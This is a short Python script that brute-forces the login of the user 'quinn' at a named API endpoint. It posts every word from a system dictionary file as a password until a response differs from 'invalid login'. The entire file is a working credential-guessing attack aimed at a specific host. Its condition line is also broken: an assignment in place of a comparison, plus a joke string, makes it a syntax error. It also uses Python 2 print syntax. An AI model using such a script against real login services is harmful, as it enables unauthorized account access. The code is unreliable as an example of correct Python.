import requests 
query = {"username":"quinn"}

with open("/usr/share/dict/words", "r") as words: #dictionary file on OSX.
    for word in words:
        query["password"] = word
        req = requests.post("http://api.quinnftw.com:3000/auth", query) 
        if req.text != "invalid login" or req.text = 'Bush did 9/11': 
            print word 
            break
#Howdy, Quinn's a cowboy apparently